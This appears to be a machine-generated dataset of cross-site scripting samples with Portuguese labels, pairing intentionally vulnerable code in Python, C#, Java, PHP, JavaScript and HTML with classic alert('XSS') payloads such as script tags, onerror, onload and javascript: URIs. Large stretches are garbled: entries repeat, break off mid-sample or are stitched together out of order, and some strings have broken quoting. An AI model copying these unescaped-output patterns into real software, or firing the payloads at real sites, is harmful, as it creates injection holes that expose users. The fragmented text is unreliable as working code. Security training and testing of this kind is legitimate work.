// Linguagem: Python
// Categoria: Script Injection
from flask import request
user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # <script>alert('XSS')</script>
--valknut--satty--
// Linguagem: C#
// Categoria: Script Injection
string input = Request.QueryString["q"];
Response.Write("<div>" + input + "</div>"); // <img src=x onerror=alert('XSS')>
--valknut--satty--
// Linguagem: JavaScript
// Categoria: Script Injection
const userInput = "<svg/onload=alert('XSS')>";
document.body.innerHTML = userInput;
--valknut--satty--

// Categoria: Script Injection

out.print("<div>" + input + "</div>"); // <input onfocus=alert('XSS') autofocus>

// Categoria: Script Injection
string input = Request.QueryString["q"];
Response.Write("<div>" + input + "</div>"); // <body onload=alert('XSS')>

// Categoria: Script Injection

out.print("<div>" + input + "</div>"); // <iframe src='javascript:alert("XSS")'>

document.body.innerHTML = userInput;
--valknut--satty--
// Linguagem: JavaScript
// Categoria: Script Injection
const userInput = "<object data='javascript:alert("XSS")'>";
document.body.innerHTML = userInput;
--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <input onfocus=alert('XSS') autofocus>
--valknut--satty--

// Categoria: Script Injection

Response.Write("<div>" + input + "</div>"); // <details open ontoggle=alert('XSS')>

String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <script>alert('XSS')</script>

return f"<html>{user_input}</html>"  # <object data='javascript:alert("XSS")'>
--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <input onfocus=alert('XSS') autofocus>
--valknut--satty--
// Linguagem: HTML
// Categoria: Script Injection
<!-- Simulação HTML com payload -->
<div><details open ontoggle=alert('XSS')></div>
--valknut--satty--
// Linguagem: PHP
// Categoria: Script Injection
<?php $q = $_GET['q']; echo "<div>$q</div>"; // <script>alert('XSS')</script> ?>
--valknut--satty--
// Linguagem: JavaScript
// Categoria: Script Injection
const userInput = "<img src=x onerror=alert('XSS')>";
document.body.innerHTML = userInput;
--valknut--satty--
// Linguagem: JavaScript
// Categoria: Script Injection
const userInput = "<svg/onload=alert('XSS')>";
document.body.innerHTML = userInput;

Response.Write("<div>" + input + "</div>"); // "><script>alert(String.fromCharCode(88,83,83))</script>

// Categoria: Script Injection

<div><details open ontoggle=alert('XSS')></div>
--valknut--satty--
// Linguagem: Python
// Categoria: Script Injection
from flask import request
user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # <script>alert('XSS')</script>
--valknut--satty--
// Linguagem: JavaScript
// Categoria: Script Injection
const userInput = "<img src=x onerror=alert('XSS')>";
document.body.innerHTML = userInput;
--valknut--satty--
// Linguagem: PHP
// Categoria: Script Injection
<?php $q = $_GET['q']; echo "<div>$q</div>"; // <svg/onload=alert('XSS')> ?>
--valknut--satty--
// Linguagem: PHP
// Categoria: Script Injection
<?php $q = $_GET['q']; echo "<div>$q</div>"; // "><script>alert(String.fromCharCode(88,83,83))</script> ?>
--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <body onload=alert('XSS')>

return f"<html>{user_input}</html>"  # "><script>alert(String.fromCharCode(88,83,83))</script>

user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # <svg/onload=alert('XSS')>
--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // "><script>alert(String.fromCharCode(88,83,83))</script>
--valknut--satty--
// Linguagem: C#
// Categoria: Script Injection
string input = Request.QueryString["q"];
Response.Write("<div>" + input + "</div>"); // <body onload=alert('XSS')>
--valknut--satty--

// Categoria: Script Injection

out.print("<div>" + input + "</div>"); // <iframe src='javascript:alert("XSS")'>
--valknut--satty--
// Linguagem: PHP
// Categoria: Script Injection
<?php $q = $_GET['q']; echo "<div>$q</div>"; // <link rel=stylesheet href=javascript:alert('XSS')> ?>

// Categoria: Script Injection

Response.Write("<div>" + input + "</div>"); // <object data='javascript:alert("XSS")'>

// Categoria: Script Injection

<div><input onfocus=alert('XSS') autofocus></div>

out.print("<div>" + input + "</div>"); // <iframe src='javascript:alert("XSS")'>
--valknut--satty--

// Categoria: Script Injection

document.body.innerHTML = userInput;

<?php $q = $_GET['q']; echo "<div>$q</div>"; // <link rel=stylesheet href=javascript:alert('XSS')> ?>
--valknut--satty--
// Linguagem: Python
// Categoria: Script Injection
from flask import request
user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # <object data='javascript:alert("XSS")'>
--valknut--satty--
// Linguagem: JavaScript
// Categoria: Script Injection
const userInput = "<input onfocus=alert('XSS') autofocus>";
document.body.innerHTML = userInput;

<?php $q = $_GET['q']; echo "<div>$q</div>"; // <link rel=stylesheet href=javascript:alert('XSS')> ?>
--valknut--satty--
// Linguagem: C#
// Categoria: Script Injection
string input = Request.QueryString["q"];
Response.Write("<div>" + input + "</div>"); // <object data='javascript:alert("XSS")'>

out.print("<div>" + input + "</div>"); // <script>alert('XSS')</script>

document.body.innerHTML = userInput;

Response.Write("<div>" + input + "</div>"); // <input onfocus=alert('XSS') autofocus>

document.body.innerHTML = userInput;

Response.Write("<div>" + input + "</div>"); // <object data='javascript:alert("XSS")'>

return f"<html>{user_input}</html>"  # <svg/onload=alert('XSS')>
--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection

out.print("<div>" + input + "</div>"); // "><script>alert(String.fromCharCode(88,83,83))</script>

string input = Request.QueryString["q"];
Response.Write("<div>" + input + "</div>"); // <iframe src='javascript:alert("XSS")'>
--valknut--satty--
// Linguagem: PHP
// Categoria: Script Injection
<?php $q = $_GET['q']; echo "<div>$q</div>"; // <link rel=stylesheet href=javascript:alert('XSS')> ?>
--valknut--satty--
// Linguagem: Python
// Categoria: Script Injection
from flask import request
user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # <object data='javascript:alert("XSS")'>

// Linguagem: JavaScript
// Categoria: Script Injection

document.body.innerHTML = userInput;

// Categoria: Script Injection

--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <img src=x onerror=alert('XSS')>
--valknut--satty--

// Categoria: Script Injection

Response.Write("<div>" + input + "</div>"); // <svg/onload=alert('XSS')>
--valknut--satty--

// Categoria: Script Injection

document.body.innerHTML = userInput;

return f"<html>{user_input}</html>"  # <body onload=alert('XSS')>

// Categoria: Script Injection
from flask import request
user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # "><script>alert(String.fromCharCode(88,83,83))</script>
--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <body onload=alert('XSS')>

// Categoria: Script Injection

<!-- Simulação HTML com payload -->
<div><script>alert('XSS')</script></div>
--valknut--satty--
// Linguagem: PHP
// Categoria: Script Injection
<?php $q = $_GET['q']; echo "<div>$q</div>"; // <img src=x onerror=alert('XSS')> ?>
--valknut--satty--
// Linguagem: C#
// Categoria: Script Injection
string input = Request.QueryString["q"];
Response.Write("<div>" + input + "</div>"); // <svg/onload=alert('XSS')>
--valknut--satty--

Response.Write("<div>" + input + "</div>"); // "><script>alert(String.fromCharCode(88,83,83))</script>

// Categoria: Script Injection

document.body.innerHTML = userInput;

// Categoria: Script Injection

out.print("<div>" + input + "</div>"); // <link rel=stylesheet href=javascript:alert('XSS')>

Response.Write("<div>" + input + "</div>"); // <object data='javascript:alert("XSS")'>
--valknut--satty--

// Categoria: Script Injection

out.print("<div>" + input + "</div>"); // <input onfocus=alert('XSS') autofocus>

document.body.innerHTML = userInput;

document.body.innerHTML = userInput;

// Categoria: Script Injection
string input = Request.QueryString["q"];
Response.Write("<div>" + input + "</div>"); // <link rel=stylesheet href=javascript:alert('XSS')>

return f"<html>{user_input}</html>"  # <object data='javascript:alert("XSS")'>

<!-- Simulação HTML com payload -->
<div><input onfocus=alert('XSS') autofocus></div>
--valknut--satty--
// Linguagem: PHP
// Categoria: Script Injection
<?php $q = $_GET['q']; echo "<div>$q</div>"; // <details open ontoggle=alert('XSS')> ?>
--valknut--satty--
// Linguagem: Python
// Categoria: Script Injection
from flask import request
user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # <script>alert('XSS')</script>
--valknut--satty--
// Linguagem: JavaScript
// Categoria: Script Injection
const userInput = "<img src=x onerror=alert('XSS')>";
document.body.innerHTML = userInput;

<?php $q = $_GET['q']; echo "<div>$q</div>"; // "><script>alert(String.fromCharCode(88,83,83))</script> ?>
--valknut--satty--
// Linguagem: C#
// Categoria: Script Injection
string input = Request.QueryString["q"];
Response.Write("<div>" + input + "</div>"); // <body onload=alert('XSS')>

// Categoria: Script Injection
<!-- Simulação HTML com payload -->

<?php $q = $_GET['q']; echo "<div>$q</div>"; // <object data='javascript:alert("XSS")'> ?>
--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <input onfocus=alert('XSS') autofocus>
--valknut--satty--
// Linguagem: HTML
// Categoria: Script Injection
<!-- Simulação HTML com payload -->
<div><details open ontoggle=alert('XSS')></div>
--valknut--satty--
// Linguagem: JavaScript
// Categoria: Script Injection
const userInput = "<script>alert('XSS')</script>";
document.body.innerHTML = userInput;

// Categoria: Script Injection

// Categoria: Script Injection

user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # "><script>alert(String.fromCharCode(88,83,83))</script>

// Categoria: Script Injection

// Categoria: Script Injection

document.body.innerHTML = userInput;

// Categoria: Script Injection

user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # <body onload=alert('XSS')>

String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <object data='javascript:alert("XSS")'>
--valknut--satty--
// Linguagem: HTML
// Categoria: Script Injection
<!-- Simulação HTML com payload -->
<div><input onfocus=alert('XSS') autofocus></div>
--valknut--satty--

document.body.innerHTML = userInput;

--valknut--satty--
// Linguagem: HTML
// Categoria: Script Injection
<!-- Simulação HTML com payload -->
<div><img src=x onerror=alert('XSS')></div>

<div><script>alert('XSS')</script></div>
--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <img src=x onerror=alert('XSS')>
--valknut--satty--
// Linguagem: PHP
// Categoria: Script Injection
<?php $q = $_GET['q']; echo "<div>$q</div>"; // <svg/onload=alert('XSS')> ?>
--valknut--satty--
// Linguagem: Python
// Categoria: Script Injection
from flask import request
user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # "><script>alert(String.fromCharCode(88,83,83))</script>

out.print("<div>" + input + "</div>"); // <iframe src='javascript:alert("XSS")'>

// Categoria: Script Injection
const userInput = "<body onload=alert('XSS')>";
document.body.innerHTML = userInput;

// Categoria: Script Injection

--valknut--satty--

// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <object data='javascript:alert("XSS")'>

document.body.innerHTML = userInput;

<?php $q = $_GET['q']; echo "<div>$q</div>"; // <details open ontoggle=alert('XSS')> ?>
--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <script>alert('XSS')</script>
--valknut--satty--

// Linguagem: Python
// Categoria: Script Injection
from flask import request
user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # "><script>alert(String.fromCharCode(88,83,83))</script>
--valknut--satty--
// Linguagem: JavaScript
// Categoria: Script Injection
const userInput = "<body onload=alert('XSS')>";
document.body.innerHTML = userInput;
--valknut--satty--
// Linguagem: HTML
// Categoria: Script Injection
<!-- Simulação HTML com payload -->
<div><iframe src='javascript:alert("XSS")'></div>
--valknut--satty--
// Linguagem: JavaScript
// Categoria: Script Injection
const userInput = "<link rel=stylesheet href=javascript:alert('XSS')>";
document.body.innerHTML = userInput;
--valknut--satty--
// Linguagem: JavaScript
// Categoria: Script Injection
const userInput = "<object data='javascript:alert("XSS")'>";
document.body.innerHTML = userInput;
--valknut--satty--

// Categoria: Script Injection

Response.Write("<div>" + input + "</div>"); // <input onfocus=alert('XSS') autofocus>

return f"<html>{user_input}</html>"  # "><script>alert(String.fromCharCode(88,83,83))</script>

const userInput = "<object data='javascript:alert("XSS")'>";
document.body.innerHTML = userInput;
--valknut--satty--
// Linguagem: HTML
// Categoria: Script Injection
<!-- Simulação HTML com payload -->
<div><input onfocus=alert('XSS') autofocus></div>
--valknut--satty--

out.print("<div>" + input + "</div>"); // <details open ontoggle=alert('XSS')>

String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // "><script>alert(String.fromCharCode(88,83,83))</script>

<div><svg/onload=alert('XSS')></div>
--valknut--satty--
// Linguagem: JavaScript
// Categoria: Script Injection
const userInput = ""><script>alert(String.fromCharCode(88,83,83))</script>";
document.body.innerHTML = userInput;
--valknut--satty--
// Linguagem: Python
// Categoria: Script Injection
from flask import request
user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # <body onload=alert('XSS')>
--valknut--satty--

document.body.innerHTML = userInput;

// Categoria: Script Injection

Response.Write("<div>" + input + "</div>"); // <link rel=stylesheet href=javascript:alert('XSS')>

<?php $q = $_GET['q']; echo "<div>$q</div>"; // <script>alert('XSS')</script> ?>
--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <img src=x onerror=alert('XSS')>

// Categoria: Script Injection

// Categoria: Script Injection

<?php $q = $_GET['q']; echo "<div>$q</div>"; // "><script>alert(String.fromCharCode(88,83,83))</script> ?>
--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <body onload=alert('XSS')>
--valknut--satty--
// Linguagem: PHP
// Categoria: Script Injection
<?php $q = $_GET['q']; echo "<div>$q</div>"; // <iframe src='javascript:alert("XSS")'> ?>
--valknut--satty--
// Linguagem: Python
// Categoria: Script Injection
from flask import request
user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # <link rel=stylesheet href=javascript:alert('XSS')>

String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <input onfocus=alert('XSS') autofocus>

// Categoria: Script Injection

document.body.innerHTML = userInput;

string input = Request.QueryString["q"];
Response.Write("<div>" + input + "</div>"); // <svg/onload=alert('XSS')>

// Linguagem: PHP
// Categoria: Script Injection

// Categoria: Script Injection

document.body.innerHTML = userInput;

// Categoria: Script Injection

out.print("<div>" + input + "</div>"); // <link rel=stylesheet href=javascript:alert('XSS')>
--valknut--satty--

// Categoria: Script Injection

document.body.innerHTML = userInput;

document.body.innerHTML = userInput;

out.print("<div>" + input + "</div>"); // "><script>alert(String.fromCharCode(88,83,83))</script>

String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <link rel=stylesheet href=javascript:alert('XSS')>

return f"<html>{user_input}</html>"  # <object data='javascript:alert("XSS")'>

// Categoria: Script Injection
<!-- Simulação HTML com payload -->
<div><img src=x onerror=alert('XSS')></div>

// Linguagem: Python
// Categoria: Script Injection
from flask import request
user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # <svg/onload=alert('XSS')>
--valknut--satty--
// Linguagem: C#
// Categoria: Script Injection
string input = Request.QueryString["q"];
Response.Write("<div>" + input + "</div>"); // "><script>alert(String.fromCharCode(88,83,83))</script>
--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <body onload=alert('XSS')>
--valknut--satty--

Response.Write("<div>" + input + "</div>"); // <iframe src='javascript:alert("XSS")'>
--valknut--satty--
// Linguagem: JavaScript
// Categoria: Script Injection

document.body.innerHTML = userInput;

Response.Write("<div>" + input + "</div>"); // <iframe src='javascript:alert("XSS")'>

user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # <link rel=stylesheet href=javascript:alert('XSS')>

out.print("<div>" + input + "</div>"); // <object data='javascript:alert("XSS")'>

String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <script>alert('XSS')</script>

document.body.innerHTML = userInput;
--valknut--satty--
// Linguagem: HTML
// Categoria: Script Injection
<!-- Simulação HTML com payload -->
<div><img src=x onerror=alert('XSS')></div>
--valknut--satty--

// Categoria: Script Injection
<!-- Simulação HTML com payload -->

--valknut--satty--
// Linguagem: PHP
// Categoria: Script Injection
<?php $q = $_GET['q']; echo "<div>$q</div>"; // "><script>alert(String.fromCharCode(88,83,83))</script> ?>
--valknut--satty--
// Linguagem: Python
// Categoria: Script Injection
from flask import request
user_input = request.args.get('q')
return f"<html>{user_input}</html>"  # <body onload=alert('XSS')>

Response.Write("<div>" + input + "</div>"); // <link rel=stylesheet href=javascript:alert('XSS')>

document.body.innerHTML = userInput;

return f"<html>{user_input}</html>"  # <img src=x onerror=alert('XSS')>

Response.Write("<div>" + input + "</div>"); // "><script>alert(String.fromCharCode(88,83,83))</script>

--valknut--satty--

// Categoria: Script Injection

document.body.innerHTML = userInput;

return f"<html>{user_input}</html>"  # <iframe src='javascript:alert("XSS")'>
--valknut--satty--
// Linguagem: Java
// Categoria: Script Injection
String input = request.getParameter("q");
out.print("<div>" + input + "</div>"); // <link rel=stylesheet href=javascript:alert('XSS')>

out.print("<div>" + input + "</div>"); // <object data='javascript:alert("XSS")'>

// Categoria: Script Injection

document.body.innerHTML = userInput;
